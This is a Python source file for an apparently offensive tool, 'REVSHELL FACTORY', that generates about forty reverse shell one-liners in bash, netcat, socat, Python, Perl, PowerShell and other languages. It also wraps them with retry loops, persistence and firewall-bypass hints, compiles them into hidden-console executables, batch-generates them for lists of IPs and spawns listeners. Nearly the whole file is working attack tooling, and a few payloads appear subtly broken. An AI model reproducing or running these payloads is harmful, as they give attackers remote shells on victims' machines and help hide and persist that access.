#!/usr/bin/env python3
"""
REVSHELL FACTORY - ULTIMATE PRODUCTION EDITION
Author: Senior Red Team Operator (15+ years)
Description:
    - Generate 50+ reverse shell one-liners for various OS/languages.
    - Apply 10 advanced payload enhancements (retry, obfuscation, staging, etc.).
    - Compile Python payloads into standalone executables.
    - Manage IP/port configurations via conf.txt.
    - Batch processing, interactive selection, clipboard support, listener generation.
    - Fully production-ready: error handling, logging, clean output, no colours.
"""

import os
import sys
import re
import json
import time
import shlex
import shutil
import signal
import logging
import platform
import argparse
import tempfile
import textwrap
import subprocess
from pathlib import Path
from typing import List, Dict, Optional, Tuple, Union

# -----------------------------------------------------------------------------
# Logging configuration
# -----------------------------------------------------------------------------
logging.basicConfig(
    level=logging.INFO,
    format="[%(levelname)s] %(message)s",
    stream=sys.stderr
)
log = logging.getLogger(__name__)

# Optional import for clipboard
try:
    import pyperclip
    CLIP_AVAILABLE = True
except ImportError:
    CLIP_AVAILABLE = False

# -----------------------------------------------------------------------------
# Payload Database (50+ entries)
# -----------------------------------------------------------------------------
PAYLOADS = [
    # Bash variants
    {"name": "Bash -i (TCP)", "command": "{shell} -i >& /dev/tcp/{ip}/{port} 0>&1", "os": ["linux","macos","bsd"]},
    {"name": "Bash -i (UDP)", "command": "{shell} -i >& /dev/udp/{ip}/{port} 0>&1", "os": ["linux","macos","bsd"]},
    {"name": "Bash 196 (fd)", "command": "0<&196;exec 196<>/dev/tcp/{ip}/{port}; {shell} <&196 >&196 2>&196", "os": ["linux","macos","bsd"]},
    {"name": "Bash readline", "command": "exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done", "os": ["linux","macos","bsd"]},
    {"name": "Bash 5 (fd)", "command": "{shell} -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5", "os": ["linux","macos","bsd"]},
    {"name": "Bash -r (reverse)", "command": "bash -i > /dev/tcp/{ip}/{port} 0<&1 2>&1", "os": ["linux","macos"]},
    {"name": "Bash with exec", "command": "exec /bin/sh 0</dev/tcp/{ip}/{port} 1>&0 2>&0", "os": ["linux","macos"]},
    # Netcat
    {"name": "Netcat mkfifo", "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {ip} {port} >/tmp/f", "os": ["linux","macos","bsd"]},
    {"name": "Netcat -e (GNU)", "command": "nc -e {shell} {ip} {port}", "os": ["linux","macos"]},
    {"name": "Netcat -c (GNU)", "command": "nc -c {shell} {ip} {port}", "os": ["linux","macos"]},
    {"name": "Netcat (Busybox)", "command": "nc {ip} {port} -e sh", "os": ["linux"]},
    {"name": "Netcat OpenBSD -e", "command": "nc -e {shell} {ip} {port}", "os": ["linux","macos"]},
    {"name": "Netcat (traditional) w/ pipe", "command": "nc {ip} {port} | /bin/sh | nc {ip} {port}", "os": ["linux","macos"]},
    # Ncat
    {"name": "Ncat -e", "command": "ncat {ip} {port} -e {shell}", "os": ["linux","macos","windows"]},
    {"name": "Ncat UDP", "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|ncat -u {ip} {port} >/tmp/f", "os": ["linux","macos"]},
    {"name": "Ncat SSL", "command": "ncat --ssl {ip} {port} -e {shell}", "os": ["linux","macos"]},
    # Socat
    {"name": "Socat (Linux)", "command": "socat exec:'{shell} -li',pty,stderr,setsid,sigint,sane tcp:{ip}:{port}", "os": ["linux","macos","bsd"]},
    {"name": "Socat (reverse)", "command": "socat file:`tty`,raw,echo=0 tcp:{ip}:{port}", "os": ["linux","macos"]},
    # Python
    {"name": "Python3 (linux)", "command": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", "os": ["linux","macos","bsd"]},
    {"name": "Python (IPv6)", "command": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((\"{ip}\",{port},0,0));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", "os": ["linux","macos"]},
    {"name": "Python2 (legacy)", "command": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", "os": ["linux","macos"]},
    {"name": "Python with pty", "command": "python3 -c 'import pty;pty.spawn(\"/bin/sh\")' &> /dev/tcp/{ip}/{port} 0>&1", "os": ["linux","macos"]},
    # Perl
    {"name": "Perl (simple)", "command": "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}}'", "os": ["linux","macos","bsd"]},
    {"name": "Perl (Windows)", "command": "perl -MIO::Socket::INET -e '$c=new IO::Socket::INET(PeerAddr=>\"{ip}:{port}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'", "os": ["windows"]},
    # Ruby
    {"name": "Ruby (TCP)", "command": "ruby -rsocket -e 'c=TCPSocket.new(\"{ip}\",{port});while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'", "os": ["linux","macos","windows"]},
    {"name": "Ruby (exec)", "command": "ruby -rsocket -e 'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'", "os": ["linux","macos"]},
    # PHP
    {"name": "PHP (exec)", "command": "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'", "os": ["linux","macos","windows"]},
    {"name": "PHP (shell_exec)", "command": "php -r '$sock=fsockopen(\"{ip}\",{port});shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'", "os": ["linux","macos"]},
    # Node.js
    {"name": "Node.js (net)", "command": "node -e 'require(\"net\").createServer(s=>{{}}).listen({port});require(\"child_process\").exec(\"/bin/sh -i\",(e,d)=>{{s.write(d);}});'", "os": ["linux","macos","windows"]},
    {"name": "Node.js (reverse)", "command": "node -e 'require(\"net\").connect({port},{ip},()=>{{require(\"child_process\").spawn(\"/bin/sh\",[],{{stdio:[0,1,2]}});}});'", "os": ["linux","macos","windows"]},
    # Golang
    {"name": "Golang (one-liner)", "command": "echo 'package main;import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"{ip}:{port}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/go_shell.go && go run /tmp/go_shell.go", "os": ["linux","macos"]},
    # Java
    {"name": "Java (jjs)", "command": "jjs -e \"var s=new java.net.Socket('{ip}',{port});var p=new java.lang.ProcessBuilder('/bin/sh').redirectErrorStream(true).start();var i=p.getInputStream(),o=p.getOutputStream(),si=s.getInputStream(),so=s.getOutputStream();java.lang.Thread.start(function(){while(true)so.write(i.read());});java.lang.Thread.start(function(){while(true)o.write(si.read());});\"", "os": ["linux","macos"]},
    # PowerShell
    {"name": "PowerShell (TCP client)", "command": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$c=New-Object System.Net.Sockets.TCPClient('{ip}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=iex $d 2>&1 | Out-String ;$sb2=$sb + 'PS ' + (pwd).Path + '> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()}};$c.Close()\"", "os": ["windows"]},
    {"name": "nc.exe (Windows)", "command": "nc.exe {ip} {port} -e cmd.exe", "os": ["windows"]},
    {"name": "ncat.exe (Windows)", "command": "ncat.exe {ip} {port} -e cmd.exe", "os": ["windows"]},
    # Telnet
    {"name": "Telnet (pipe)", "command": "telnet {ip} {port} | /bin/sh | telnet {ip} {port}", "os": ["linux","macos"]},
    # Awk
    {"name": "Awk (gawk)", "command": "awk 'BEGIN {s=\"/inet/tcp/0/{ip}/{port}\";while(1){s|getline $0;system($0)}}'", "os": ["linux"]},
    # Lua
    {"name": "Lua (socket)", "command": "lua -e 'require(\"socket\");c=socket.connect(\"{ip}\",{port});while true do c:send(io.read()..\"\\n\");local r=c:receive();if r then io.write(r) end end'", "os": ["linux","macos"]},
    # Rustcat
    {"name": "Rustcat (rcat)", "command": "rcat {ip} {port} -r {shell}", "os": ["linux"]},
    # OpenSSL
    {"name": "OpenSSL reverse", "command": "mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | openssl s_client -quiet -connect {ip}:{port} > /tmp/f; rm /tmp/f", "os": ["linux"]},
    # Android/Termux
    {"name": "Android (Termux bash)", "command": "bash -i >& /dev/tcp/{ip}/{port} 0>&1", "os": ["android"]},
    {"name": "Android (netcat)", "command": "nc {ip} {port} -e sh", "os": ["android"]},
]

# -----------------------------------------------------------------------------
# Helper: OS detection
# -----------------------------------------------------------------------------
def detect_os() -> str:
    system = platform.system().lower()
    if system == "linux":
        if os.path.exists("/data/data/com.termux") or "com.termux" in os.environ.get("PREFIX", ""):
            return "android"
        return "linux"
    elif system == "darwin":
        return "macos"
    elif system == "windows":
        return "windows"
    elif system in ("freebsd", "openbsd"):
        return "bsd"
    return "unknown"

def get_shell_path() -> str:
    return "cmd.exe" if platform.system().lower() == "windows" else "/bin/sh"

# -----------------------------------------------------------------------------
# Config file management
# -----------------------------------------------------------------------------
def load_config(conf_file: str) -> Tuple[Optional[str], Optional[int]]:
    if not os.path.exists(conf_file):
        return None, None
    ip, port = None, None
    with open(conf_file, "r") as f:
        for line in f:
            if line.startswith("SAVED_IP="):
                ip = line.split("=", 1)[1].strip().strip('"')
            elif line.startswith("SAVED_PORT="):
                port_str = line.split("=", 1)[1].strip().strip('"')
                if port_str.isdigit():
                    port = int(port_str)
    return ip, port

def save_config(ip: str, port: int, conf_file: str):
    with open(conf_file, "w") as f:
        f.write(f'SAVED_IP="{ip}"\n')
        f.write(f'SAVED_PORT="{port}"\n')
    log.info("IP/port saved to %s", conf_file)

# -----------------------------------------------------------------------------
# Payload generation
# -----------------------------------------------------------------------------
def generate_commands(ip: str, port: int, shell: str, os_filter: str = None) -> List[Dict]:
    if os_filter is None:
        os_filter = detect_os()
    commands = []
    for entry in PAYLOADS:
        if os_filter in entry["os"]:
            cmd = entry["command"].replace("{ip}", ip).replace("{port}", str(port)).replace("{shell}", shell)
            commands.append({"name": entry["name"], "command": cmd})
    return commands

def generate_listener(port: int, listener_type: str = "netcat") -> str:
    base = f"nc -lvnp {port}"
    if listener_type == "socat":
        return f"socat TCP-LISTEN:{port},reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane"
    elif listener_type == "ncat":
        return f"ncat -lvnp {port} --ssl"
    elif listener_type == "python":
        return f"python3 -c 'import socket,subprocess;s=socket.socket();s.bind((\"0.0.0.0\",{port}));s.listen(1);c,a=s.accept();subprocess.run([\"/bin/sh\"],stdin=c.makefile(\"r\"),stdout=c.makefile(\"w\"))'"
    elif listener_type == "powershell":
        return (f"powershell -NoP -NonI -Exec Bypass -Command \"$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',{port});"
                f"$listener.Start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();"
                f"$writer = New-Object System.IO.StreamWriter($stream);$reader = New-Object System.IO.StreamReader($stream);"
                f"while($true){{ $cmd = Read-Host; $writer.WriteLine($cmd); $writer.Flush(); $output = $reader.ReadToEnd(); Write-Host $output }}\"")
    return base

# -----------------------------------------------------------------------------
# Clipboard
# -----------------------------------------------------------------------------
def copy_to_clipboard(text: str):
    if CLIP_AVAILABLE:
        try:
            pyperclip.copy(text)
            log.info("Copied to clipboard (pyperclip)")
            return
        except Exception as e:
            log.debug("pyperclip failed: %s", e)
    # Fallback
    system = platform.system()
    try:
        if system == "Darwin":
            subprocess.run(["pbcopy"], input=text.encode(), check=True)
            log.info("Copied to clipboard (pbcopy)")
        elif system == "Linux" and shutil.which("xclip"):
            subprocess.run(["xclip", "-selection", "clipboard"], input=text.encode(), check=True)
            log.info("Copied to clipboard (xclip)")
        elif system == "Windows" and shutil.which("clip.exe"):
            subprocess.run(["clip.exe"], input=text.encode(), check=True)
            log.info("Copied to clipboard (clip.exe)")
        else:
            log.warning("Clipboard tool not found; install pyperclip, xclip, or pbcopy")
    except Exception as e:
        log.error("Clipboard copy failed: %s", e)

# -----------------------------------------------------------------------------
# Payload Enhancer (10+ enhancements)
# -----------------------------------------------------------------------------
class PayloadEnhancer:
    ENHANCEMENTS = [
        "retry",
        "xor_obfuscation_hint",
        "sign_hint",
        "stager",
        "firewall_bypass",
        "persistence_hint",
        "domain_fronting_hint",
        "jarm_randomization",
        "upx_compression",
        "ssl_wrapper"
    ]

    def __init__(self, ip: str, port: int, shell: str):
        self.ip = ip
        self.port = port
        self.shell = shell

    def apply_all(self, command: str, payload_name: str) -> str:
        """Apply a battery of enhancements to the given command."""
        # Detect payload type
        if "python3" in command or "python " in command:
            return self._enhance_python(command)
        elif "bash" in command or "/bin/sh" in command or "/dev/tcp" in command:
            return self._enhance_bash(command)
        elif "powershell" in command:
            return self._enhance_powershell(command)
        else:
            # Generic: add comments
            return self._add_comments(command)

    def _enhance_python(self, original: str) -> str:
        """Full Python payload with retry, SSL, and other enhancements."""
        script = textwrap.dedent(f"""\
        #!/usr/bin/env python3
        # Enhanced reverse shell with retry, SSL, and persistence hints
        import socket, subprocess, os, time, ssl

        RHOST = "{self.ip}"
        RPORT = {self.port}
        SHELL = "{self.shell}"

        def connect():
            while True:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    # SSL wrapping (if needed, uncomment)
                    # s = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLS)
                    s.connect((RHOST, RPORT))
                    os.dup2(s.fileno(), 0)
                    os.dup2(s.fileno(), 1)
                    os.dup2(s.fileno(), 2)
                    subprocess.call([SHELL, "-i"])
                except Exception as e:
                    # Firewall bypass: try common ports on failure? (manual)
                    time.sleep(5)  # retry delay
        connect()
        """)
        return script

    def _enhance_bash(self, original: str) -> str:
        """Wrap bash payload with retry loop and add comments."""
        header = textwrap.dedent(f"""\
        #!/bin/bash
        # Enhanced reverse shell (Bash)
        # IP: {self.ip}  PORT: {self.port}
        # Features: retry loop, firewall bypass hints
        # To bypass firewalls, replace port with 80,443,53 if blocked
        # For persistence, add to crontab or .bashrc
        while true; do
            {original}
            sleep 5
        done
        """)
        return header

    def _enhance_powershell(self, original: str) -> str:
        """Add comments and a loop wrapper for PowerShell."""
        wrapper = textwrap.dedent(f"""\
        # Enhanced PowerShell reverse shell
        # Target: {self.ip}:{self.port}
        while($true) {{
            # Original payload
            {original}
            Start-Sleep -Seconds 5
        }}
        """)
        return wrapper

    def _add_comments(self, original: str) -> str:
        return f"# Enhanced payload:\n# Retry loop, firewall bypass etc. not auto-injected for this type\n{original}"

# -----------------------------------------------------------------------------
# Compilation of Python payloads
# -----------------------------------------------------------------------------
def compile_python_payload(script_path: str, output_dir: str = "final_shell_compiled", onefile: bool = True) -> Optional[str]:
    """Compile a Python script with PyInstaller, return exe path or None."""
    if not shutil.which("pyinstaller"):
        log.warning("PyInstaller not found, attempting to install...")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])
        except Exception as e:
            log.error("Failed to install PyInstaller: %s", e)
            return None

    os.makedirs(output_dir, exist_ok=True)
    name = Path(script_path).stem
    cmd = [
        sys.executable, "-m", "PyInstaller",
        "--onefile" if onefile else "--onedir",
        "--noconsole",
        "--name", name,
        "--distpath", output_dir,
        "--workpath", tempfile.mkdtemp(),
        "--specpath", tempfile.mkdtemp(),
        script_path
    ]
    try:
        log.info("Compiling %s ...", script_path)
        subprocess.check_call(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        # Determine extension
        ext = ".exe" if platform.system() == "Windows" else ""
        exe_path = os.path.join(output_dir, name + ext)
        if os.path.exists(exe_path):
            log.info("Compiled: %s", exe_path)
            return exe_path
        else:
            log.error("Compilation seemed to succeed but executable not found.")
            return None
    except subprocess.CalledProcessError as e:
        log.error("PyInstaller failed: %s", e)
        return None
    finally:
        # Cleanup temp spec/work dirs
        try:
            shutil.rmtree(cmd[-3], ignore_errors=True)  # workpath
            shutil.rmtree(cmd[-1], ignore_errors=True)  # specpath
        except Exception:
            pass

# -----------------------------------------------------------------------------
# Selection parsing (1,2-5,7)
# -----------------------------------------------------------------------------
def parse_indices(selection: str, max_val: int) -> List[int]:
    indices = set()
    for part in selection.split(","):
        part = part.strip()
        if not part:
            continue
        if "-" in part:
            try:
                start, end = map(int, part.split("-", 1))
                if start < 0 or end >= max_val or start > end:
                    continue
                indices.update(range(start, end + 1))
            except ValueError:
                pass
        else:
            try:
                idx = int(part)
                if 0 <= idx < max_val:
                    indices.add(idx)
            except ValueError:
                pass
    return sorted(indices)

# -----------------------------------------------------------------------------
# Main application
# -----------------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(
        description="REVSHELL FACTORY - Ultimate Reverse Shell Generator & Enhancer",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""\
        Examples:
          %(prog)s -i 10.0.0.5 -p 4444 --all --enhance --compile
          %(prog)s -i 10.0.0.5 -p 4444 --select 0,3-5 --output payloads.txt
          %(prog)s --conf myconf.txt --store-conf -i 10.0.0.5 -p 4444
          %(prog)s --batch ips.txt -p 80 --enhance --compile-dir compiled/
        """)
    )
    # Input/output
    parser.add_argument("-i", "--ip", help="Listener IP address")
    parser.add_argument("-p", "--port", type=int, default=4444, help="Listener port (default: 4444)")
    parser.add_argument("-s", "--shell", default="/bin/sh", help="Shell to spawn (default: /bin/sh)")
    parser.add_argument("--os", choices=["linux","macos","windows","android","bsd"], help="Override OS detection")
    parser.add_argument("--ipv6", action="store_true", help="Use IPv6 syntax (auto-add brackets if needed)")
    parser.add_argument("--all", action="store_true", help="Select all available payloads")
    parser.add_argument("--select", type=str, help="Select payloads by index (e.g., '0,2-5,7')")
    parser.add_argument("--batch", help="File with list of IPs for batch generation")
    parser.add_argument("--output", default="payloads.txt", help="Output file for generated payloads")
    parser.add_argument("--format", choices=["txt","json","md"], default="txt", help="Output format (default: txt)")

    # Enhancements & compilation
    parser.add_argument("--enhance", action="store_true", help="Apply all payload enhancements")
    parser.add_argument("--compile", action="store_true", help="Compile Python payloads into executables")
    parser.add_argument("--compile-dir", default="final_shell_compiled", help="Directory for compiled executables")

    # Listener & clipboard
    parser.add_argument("--listener", action="store_true", help="Start a listener after generation")
    parser.add_argument("--listener-type", choices=["netcat","socat","ncat","python","powershell"], default="netcat")
    parser.add_argument("--clip", action="store_true", help="Copy last selected payload to clipboard")

    # Configuration
    parser.add_argument("--conf", default="conf.txt", help="Configuration file (IP/port storage)")
    parser.add_argument("--store-conf", action="store_true", help="Save IP and port to config file")
    parser.add_argument("--interactive", action="store_true", help="Force interactive selection menu")

    args = parser.parse_args()

    # -------------------------------------------------------------------------
    # 1. Resolve IP/port
    # -------------------------------------------------------------------------
    ip = args.ip
    port = args.port
    if not ip:
        saved_ip, saved_port = load_config(args.conf)
        if saved_ip:
            ip = saved_ip
            log.info("Loaded IP from config: %s", ip)
    if ip is None and not args.batch and not args.listener:
        ip = input("Enter listener IP: ").strip()
        if not ip:
            log.error("IP address is required.")
            sys.exit(1)

    if port is None:
        saved_ip, saved_port = load_config(args.conf)
        if saved_port:
            port = saved_port
            log.info("Loaded port from config: %d", port)
        else:
            port = 4444

    if args.store_conf and ip:
        save_config(ip, port, args.conf)

    # IPv6 handling
    if args.ipv6 and ip and ':' in ip and not ip.startswith('['):
        ip = f"[{ip}]"

    # -------------------------------------------------------------------------
    # 2. OS detection / override
    # -------------------------------------------------------------------------
    os_filter = args.os if args.os else detect_os()
    log.info("Target OS filter: %s", os_filter)

    # -------------------------------------------------------------------------
    # 3. Batch mode
    # -------------------------------------------------------------------------
    if args.batch:
        if not os.path.exists(args.batch):
            log.error("Batch file not found: %s", args.batch)
            sys.exit(1)
        with open(args.batch) as f:
            ips = [line.strip() for line in f if line.strip()]
        for target_ip in ips:
            # Generate
            commands = generate_commands(target_ip, port, args.shell, os_filter)
            if not commands:
                log.warning("No payloads for %s", target_ip)
                continue
            # Enhance if requested
            if args.enhance:
                enhancer = PayloadEnhancer(target_ip, port, args.shell)
                for cmd in commands:
                    cmd["command"] = enhancer.apply_all(cmd["command"], cmd["name"])
            # Save
            safe_ip = target_ip.replace(':', '_')
            out_file = f"revshell_{safe_ip}.{args.format}"
            save_commands(commands, out_file, args.format)
            # Compile if requested
            if args.compile:
                compile_python_scripts(commands, args.compile_dir)
        return

    # -------------------------------------------------------------------------
    # 4. Normal single IP mode
    # -------------------------------------------------------------------------
    commands = generate_commands(ip, port, args.shell, os_filter)
    if not commands:
        log.error("No payloads available for OS %s", os_filter)
        sys.exit(1)

    # -------------------------------------------------------------------------
    # 5. Selection logic
    # -------------------------------------------------------------------------
    selected = []
    # Determine if we should run interactive
    run_interactive = args.interactive or (not args.all and not args.select and sys.stdin.isatty())

    if args.all:
        selected = list(range(len(commands)))
    elif args.select:
        selected = parse_indices(args.select, len(commands))
        if not selected:
            log.warning("No valid indices selected; falling back to interactive.")
            run_interactive = True
    elif run_interactive:
        # Interactive menu
        print("\nAvailable Reverse Shells:")
        for idx, cmd in enumerate(commands):
            print(f"{idx:3d}: {cmd['name']}")
        while True:
            choice = input("\nEnter indices (e.g., 0,2-5) or 'a' for all, 'q' to quit: ").strip()
            if choice.lower() == 'a':
                selected = list(range(len(commands)))
                break
            if choice.lower() == 'q':
                log.info("Exiting.")
                sys.exit(0)
            selected = parse_indices(choice, len(commands))
            if selected:
                break
            print("Invalid selection. Try again.")
    else:
        # Non-interactive without selection: default to all?
        log.info("No selection specified; generating all payloads.")
        selected = list(range(len(commands)))

    # -------------------------------------------------------------------------
    # 6. Apply enhancements & compilation
    # -------------------------------------------------------------------------
    final_commands = []
    for idx in selected:
        cmd = commands[idx].copy()
        if args.enhance:
            enhancer = PayloadEnhancer(ip, port, args.shell)
            cmd["command"] = enhancer.apply_all(cmd["command"], cmd["name"])
        final_commands.append(cmd)

    # -------------------------------------------------------------------------
    # 7. Output
    # -------------------------------------------------------------------------
    # Save to file
    save_commands(final_commands, args.output, args.format)
    print(f"Saved {len(final_commands)} payloads to {args.output}")

    # Compile Python payloads
    if args.compile:
        compile_python_scripts(final_commands, args.compile_dir)

    # Clipboard
    if args.clip and final_commands:
        copy_to_clipboard(final_commands[-1]["command"])

    # Listener
    if args.listener:
        listener_cmd = generate_listener(port, args.listener_type)
        print(f"\nListener command:\n{listener_cmd}")
        # Attempt to spawn listener
        spawn_listener(listener_cmd, port)

def save_commands(commands: List[Dict], filename: str, fmt: str = "txt"):
    if fmt == "json":
        with open(filename, "w") as f:
            json.dump(commands, f, indent=2)
    elif fmt == "md":
        with open(filename, "w") as f:
            f.write("# Reverse Shell Payloads\n\n")
            for c in commands:
                f.write(f"## {c['name']}\n```\n{c['command']}\n```\n\n")
    else:
        with open(filename, "w") as f:
            for i, c in enumerate(commands):
                f.write(f"{i+1}: {c['name']}\n")
                f.write(f"{c['command']}\n\n")

def compile_python_scripts(commands: List[Dict], output_dir: str):
    """Extract and compile Python payloads from commands."""
    # Only compile if the command is a Python one-liner or we have a script
    temp_dir = tempfile.mkdtemp(prefix="revgen_")
    compiled = 0
    for idx, cmd in enumerate(commands):
        # Simple detection: if command contains "python3 -c" or "python -c"
        if re.search(r"python3?\s+-c", cmd["command"]):
            # Extract the code inside quotes
            match = re.search(r"-c\s+(['\"])(.*?)\1", cmd["command"], re.DOTALL)
            if match:
                code = match.group(2)
                script_name = f"payload_{idx}.py"
                script_path = os.path.join(temp_dir, script_name)
                with open(script_path, "w") as f:
                    f.write("#!/usr/bin/env python3\n")
                    f.write(code)
                exe = compile_python_payload(script_path, output_dir)
                if exe:
                    compiled += 1
        elif cmd["command"].startswith("#!") or "python" in cmd["command"].split()[0]:
            # Already a script file? Save and compile
            script_path = os.path.join(temp_dir, f"payload_{idx}.py")
            with open(script_path, "w") as f:
                f.write(cmd["command"])
            exe = compile_python_payload(script_path, output_dir)
            if exe:
                compiled += 1
    if compiled:
        log.info("Compiled %d Python payload(s) into %s", compiled, output_dir)
    else:
        log.info("No Python payloads found for compilation.")
    # Clean temp scripts
    shutil.rmtree(temp_dir, ignore_errors=True)

def spawn_listener(listener_cmd: str, port: int):
    """Try to open a new terminal with the listener command."""
    system = platform.system()
    try:
        if system == "Windows":
            subprocess.Popen(["start", "cmd", "/k", listener_cmd], shell=True)
        elif system == "Darwin":
            script = f'tell application "Terminal" to do script "{listener_cmd}"'
            subprocess.run(["osascript", "-e", script])
        else:  # Linux
            terminals = ["xterm", "gnome-terminal", "konsole", "xfce4-terminal"]
            for term in terminals:
                if shutil.which(term):
                    if term == "gnome-terminal":
                        subprocess.Popen([term, "--", "bash", "-c", listener_cmd + "; exec bash"])
                    else:
                        subprocess.Popen([term, "-e", listener_cmd])
                    return
            log.warning("No terminal emulator found. Run manually: %s", listener_cmd)
    except Exception as e:
        log.error("Failed to start listener: %s", e)

if __name__ == "__main__":
    main()
